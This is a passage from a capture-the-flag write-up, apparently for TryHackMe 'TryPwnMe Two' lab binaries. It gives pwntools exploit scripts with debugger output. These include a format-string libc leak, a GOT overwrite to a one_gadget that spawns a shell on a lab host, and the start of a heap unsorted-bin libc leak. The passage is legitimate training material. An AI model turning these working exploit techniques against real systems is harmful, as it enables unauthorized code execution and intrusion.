+Breakpoint 1,</span><span class="az"> 0x0000000000401307</span><span class="p"> in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap 0x7ffff7ea7a37
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+    0x7ffff7d93000     0x7ffff7dbb000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7ffff7dbb000     0x7ffff7f50000 r-xp   195000  28000 /home/user/libc.so.6 +0xeca37  
+</span><span class="p">    0x7ffff7f50000     0x7ffff7fa8000 r--p    58000 1bd000 /home/user/libc.so.6
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x7ffff7ea7a37 - 0x7ffff7d93000
+</span><span class="az">$1</span><span class="p"> = 0x114a37
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import </span><span class="p">gdb, context, log fmtstr_payload
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./notspecified2"</span><span class="p">,</span><span class="s"> "b *main+135</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%3$p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"Thanks "</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x114a37</span><span class="p">
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 3910
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './notspecified2']  
+[</span><span class="az">*</span><span class="p">] Libc base: 0x7f02d2e6e000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0000000000401307 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK </span><span class="p">|</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+    </span><span class="sa">0x7f02d2e6b000     0x7f02d2e6e000 rw-p     3000      0 [anon_7f02d2e6b]
+</span><span class="p">►   0x7f02d2e6e000     0x7f02d2e96000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7f02d2e96000     0x7f02d302b000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x7f02d302b000     0x7f02d3083000 r--p    58000 1bd000 /home/user/libc.so.6
+►   0x7f02d3083000     0x7f02d3087000 r--p     4000 214000 /home/user/libc.so.6
+</span><span class="sa">►   0x7f02d3087000     0x7f02d3089000 rw-p     2000 218000 /home/user/libc.so.6  
+    0x7f02d3089000     0x7f02d3098000 rw-p     f000      0 [anon_7f02d3089]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./notspecified2</span><span class="p">
+  _______ _    _ __  __
+ |__   __| |  | |  \/  |
+    | |  | |__| | \  / |
+    | |  |  __  | |\/| |
+    | |  | |  | | |  | |
+    |_|  |_|  |_|_|  |_|
+
+
+Please provide your username:
+AAAABBBB.%6$p
+Thanks AAAABBBB.0x4242424241414141  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> got -r exit
+Filtering by symbol name: </span><span class="am">exit</span><span class="p">
+
+State of the GOT of </span><span class="sa">/home/user/notspecified2</span><span class="p">:
+GOT protection:</span><span class="am"> Partial RELRO</span><span class="p"> | Found</span><span class="am"> 1</span><span class="p"> GOT entries passing the filter  
+[</span><span class="sa">0x404038</span><span class="p">]</span><span class="am"> exit@GLIBC_2.2.5</span><span class="p"> -></span><span class="ro"> 0x401070</span><span class="p"> ◂— </span><span class="ve">endbr64</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> p _start
+</span><span class="az">$1</span><span class="p"> = {&lttext variable, no debug info>}</span><span class="az"> 0x4010d0 </span><span class="p"><</span><span class="am">_start</span><span class="p">>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, fmtstr_payload
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./notspecified2"</span><span class="p">,</span><span class="s"> "b *main+135</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+context.arch </span><span class="o">= </span><span class="s">"amd64"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">fmtstr_payload(</span><span class="mi">6</span><span class="p">, {</span><span class="mi">0x404038</span><span class="p">:</span><span class="mi"> 0x4010d0</span><span class="p">})
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)</span><span class="c1"> # exit@got = _start()</span><span class="p">
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0000000000401307 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> got -r exit
+Filtering by symbol name: </span><span class="am">exit</span><span class="p">
+
+State of the GOT of </span><span class="sa">/home/user/notspecified2</span><span class="p">:
+GOT protection:</span><span class="am"> Partial RELRO</span><span class="p"> | Found</span><span class="am"> 1</span><span class="p"> GOT entries passing the filter  
+[</span><span class="sa">0x404038</span><span class="p">]</span><span class="am"> exit@GLIBC_2.2.5</span><span class="p"> -></span><span class="ro"> 0x4010d0 (_start)</span><span class="p"> ◂— </span><span class="na">endbr64</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ one_gadget</span><span class="p"> libc.so.6
+</span><span class="mo">0xebcf1</span><span class="p"> execve("/bin/sh",</span><span class="ve"> r10</span><span class="p">, [</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">])
+</span><span class="ro">constraints</span><span class="p">:
+  address </span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x78</span><span class="p"> is writable
+  [</span><span class="ve">r10</span><span class="p">] == NULL || </span><span class="ve">r10</span><span class="p"> == NULL ||</span><span class="ve"> r10</span><span class="p"> is a valid argv
+  [[</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">]] == NULL || [</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">] == NULL || [</span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x70</span><span class="p">] is a valid envp  
+
+</span><span class="mo">0xebcf5</span><span class="p"> execve("/bin/sh",</span><span class="ve"> r10</span><span class="p">,</span><span class="ve"> rdx</span><span class="p">)
+</span><span class="ro">constraints</span><span class="p">:
+  address </span><span class="ve">rbp</span><span class="p">-</span><span class="mo">0x78</span><span class="p"> is writable
+  [</span><span class="ve">r10</span><span class="p">] == NULL ||</span><span class="ve"> r10</span><span class="p"> == NULL ||</span><span class="ve"> r10</span><span class="p"> is a valid argv
+  [</span><span class="ve">rdx</span><span class="p">] == NULL ||</span><span class="ve"> rdx</span><span class="p"> == NULL ||</span><span class="ve"> rdx</span><span class="p"> is a valid envp</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, fmtstr_payload
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./notspecified2"</span><span class="p">,</span><span class="s"> "b *main+135</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+payload</span><span class="o"> =</span><span class="p"> fmtstr_payload(</span><span class="mi">6</span><span class="p">, {</span><span class="mi">0x404038</span><span class="p">:</span><span class="mi"> 0x4010d0</span><span class="p">})
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)</span><span class="c1"> # exit@got = _start()</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%3$p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"Thanks "</span><span class="p">)
+
+libc_base </span><span class="o">= </span><span class="na">int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x114a37</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">fmtstr_payload(</span><span class="mi">6</span><span class="p">, {</span><span class="mi">0x404038</span><span class="p">: libc_base</span><span class="o"> +</span><span class="mi"> 0xebcf1</span><span class="p">})
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)</span><span class="c1"> # exit@got = one_gadget
+</span><span class="p">
+shell.recv()
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0000000000401307 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> c 2
+Will ignore next crossing of breakpoint 1.  Continuing.
+
+Breakpoint 1,</span><span class="az"> 0x0000000000401307 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> got -r exit
+Filtering by symbol name: </span><span class="am">exit</span><span class="p">
+
+State of the GOT of </span><span class="sa">/home/user/notspecified2</span><span class="p">:
+GOT protection:</span><span class="am"> Partial RELRO</span><span class="p"> | Found</span><span class="am"> 1</span><span class="p"> GOT entries passing the filter
+[</span><span class="sa">0x404038</span><span class="p">]</span><span class="am"> exit@GLIBC_2.2.5</span><span class="p"> -> </span><span class="ro">0x7f5ad371bcf1 </span><span class="p">◂—</span><span class="na"> mov</span><span class="no"> rdx</span><span class="p">,</span><span class="no"> qword ptr </span><span class="p">[</span><span class="no">rbp</span><span class="p"> -</span><span class="mo"> 0x70</span><span class="p">]  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, context, fmtstr_payload
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"10.10.212.25"</span><span class="p">,</span><span class="mi"> 5000</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+payload</span><span class="o"> =</span><span class="p"> fmtstr_payload(</span><span class="mi">6</span><span class="p">, {</span><span class="mi">0x404038</span><span class="p">:</span><span class="mi"> 0x4010d0</span><span class="p">})
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)</span><span class="c1"> # exit@got = _start()</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"%3$p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"Thanks "</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x114a37</span><span class="p">
+
+payload</span><span class="o"> =</span><span class="p"> fmtstr_payload(</span><span class="mi">6</span><span class="p">, {</span><span class="mi">0x404038</span><span class="p">: libc_base</span><span class="o"> +</span><span class="mi"> 0xebcf5</span><span class="p">})
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)</span><span class="c1"> # exit@got = one_gadget</span><span class="p">  
+
+shell.recv()
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.212.25 on port 5000: Done  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000 gid=1000 groups=1000
+</span><span class="ro">$ </span><span class="p">cat flag.txt
+THM{f0rm4t-str1ng-n0t-sp3cified-ag4in}
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="tryanote">
+<br><h3 class="post-title">Try a Note</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./tryanote</span><span class="p">
+ #######                 ######                    #     # #######     #####
+    #    #####  #   #    #     # #    # #    #     ##   ## #          #     #
+    #    #    #  # #     #     # #    # ##   #     # # # # #                #
+    #    #    #   #      ######  #    # # #  #     #  #  # #####       #####
+    #    #####    #      #       # ## # #  # #     #     # #          #
+    #    #   #    #      #       ##  ## #   ##     #     # #          #
+    #    #    #   #      #       #    # #    #     #     # #######    #######  
+
+[1] Create:
+[2] Read:
+[3] Update:
+[4] Delete:
+[5] Win
+[0] Exit:
+>></span>
+</code></pre></div></div><br>
+
+<a href="/tryhackme/trypwnmetwo/9.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/9.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/10.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/10.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/11.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/11.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/12.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/12.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/13.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/13.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/14.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/14.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/15.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/15.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/16.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/16.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/20.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/20.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/21.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/21.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/22.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/22.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/17.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/17.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/18.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/18.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/19.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/19.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/23.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/23.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/24.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/24.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/25.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/25.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> tryanote
+[</span><span class="az">*</span><span class="p">] '/home/user/tryanote'
+    Arch:       amd64-64-little  
+    RELRO:      </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:      </span><span class="ve">Canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./tryanote"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> create</span><span class="p">(</span><span class="ra">size</span><span class="p">, </span><span class="ra">data</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(size).encode())
+    shell.sendafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, data)
+
+</span><span class="o">def</span><span class="na"> show</span><span class="p">(</span><span class="ra">index</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(index).encode())
+    </span><span class="o">return</span><span class="p"> shell.recvline().strip()
+
+</span><span class="o">def</span><span class="na"> update</span><span class="p">(</span><span class="ra">index</span><span class="p">,</span><span class="ra"> data</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":\n"</span><span class="p">, </span><span class="na">str</span><span class="p">(index).encode())
+    shell.sendafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, data)
+
+</span><span class="o">def</span><span class="na"> delete</span><span class="p">(</span><span class="ra">index</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(index).encode())
+
+</span><span class="o">def</span><span class="na"> win</span><span class="p">(</span><span class="ra">index</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"5"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(index).encode())  
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">^C
+</span><span class="az">0x00007f670ce2f2b0 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> heap
+</span><span class="am">Allocated chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr:</span><span class="az"> 0x55944213b000</span><span class="p">
+Size: 0x290 (with flag bits: 0x291)
+
+</span><span class="am">Allocated chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr:</span><span class="az"> 0x55944213b290</span><span class="p">
+Size: 0x510 (with flag bits: 0x511)
+
+</span><span class="am">Allocated chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr:</span><span class="az"> 0x55944213b7a0</span><span class="p">
+Size: 0x510 (with flag bits: 0x511)
+
+</span><span class="ro">Top chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr:</span><span class="az"> 0x55944213bcb0</span><span class="p">
+Size: 0x20350 (with flag bits: 0x20351)  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vis 0x55944213b290
+0x55944213b290  </span><span class="am">0x0000000000000000</span><span class="az">      0x0000000000000511      ................</span><span class="p">
+0x55944213b2a0  </span><span class="az">0x4141414141414141      0x0000000000000000      AAAAAAAA........</span><span class="p">
+0x55944213b2b0  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b2c0  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b2d0  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b2e0  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+..............  </span><span class="az">..................      ..................      ................</span><span class="p">
+0x55944213b760  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b770  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b780  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b790  </span><span class="az">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b7a0  </span><span class="az">0x0000000000000000      </span><span class="sa">0x0000000000000511      ................</span><span class="p">
+0x55944213b7b0  </span><span class="sa">0x4242424242424242      0x0000000000000000      BBBBBBBB........</span><span class="p">
+0x55944213b7c0  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b7d0  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b7e0  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b7f0  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213b800  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+..............  </span><span class="sa">..................      ..................      ................</span><span class="p">
+0x55944213bc70  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213bc80  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213bc90  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213bca0  </span><span class="sa">0x0000000000000000      0x0000000000000000      ................</span><span class="p">
+0x55944213bcb0  </span><span class="sa">0x0000000000000000      </span><span class="ve">0x0000000000020351      ........Q.......</span><span class="p">   <-- Top chunk  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+delete(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> heap
+</span><span class="am">Allocated chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr:</span><span class="az"> 0x55944213b000</span><span class="p">
+Size: 0x290 (with flag bits: 0x291)
+
+</span><span class="ve">Free chunk (unsortedbin)</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr: </span><span class="az">0x55944213b290</span><span class="p">
+Size: 0x510 (with flag bits: 0x511)
+</span><span class="ro">fd</span><span class="p">: 0x7f670cdfece0
+</span><span class="ro">bk</span><span class="p">: 0x7f670cdfece0
+
+</span><span class="am">Allocated chunk</span><span class="p">
+Addr:</span><span class="az"> 0x55944213b7a0</span><span class="p">
+Size: 0x510 (with flag bits: 0x510)
+
+</span><span class="ro">Top chunk</span><span class="p"> |</span><span class="am"> PREV_INUSE</span><span class="p">
+Addr:</span><span class="az"> 0x55944213bcb0</span><span class="p">
+Size: 0x20350 (with flag bits: 0x20351)
+</span><span class="ro">pwndbg></span><span class="p"> unsortedbin
+</span><span class="az">unsortedbin</span><span class="p">
+</span><span class="am">all</span><span class="p">: </span><span class="az">0x55944213b290</span><span class="p"> —▸ </span><span class="sa">0x7f670cdfece0 (main_arena+96)</span><span class="p"> ◂— </span><span class="az">0x55944213b290  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/6gx 0x55944213b290
+</span><span class="az">0x55944213b290</span><span class="p">: 0x0000000000000000      0x0000000000000511  
+</span><span class="az">0x55944213b2a0</span><span class="p">: 0x00007f670cdfece0      0x00007f670cdfece0  
+</span><span class="az">0x55944213b2b0</span><span class="p">: 0x0000000000000000      0x0000000000000000  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x7f670cbe2000     0x7f670cbe5000 rw-p     3000      0 [anon_7f670cbe2]
+</span><span class="p">►   0x7f670cbe5000     0x7f670cc0d000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7f670cc0d000     0x7f670cda2000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x7f670cda2000     0x7f670cdfa000 r--p    58000 1bd000 /home/user/libc.so.6
+</span><span class="p">►   0x7f670cdfa000     0x7f670cdfe000 r--p     4000 214000 /home/user/libc.so.6
+</span><span class="sa">►   0x7f670cdfe000     0x7f670ce00000 rw-p     2000 218000 /home/user/libc.so.6  
+</span><span class="sa">    0x7f670ce00000     0x7f670ce0f000 rw-p     f000      0 [anon_7f670ce00]
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x00007f670cdfece0 - 0x7f670cbe5000
+</span><span class="az">$1</span><span class="p"> = 0x219ce0
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+delete(</span><span class="mi">0</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(show(</span><span class="mi">0</span><span class="p">).ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">- </span><span class="mi">0x219ce0</span><span class="p">  
+log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)</span>
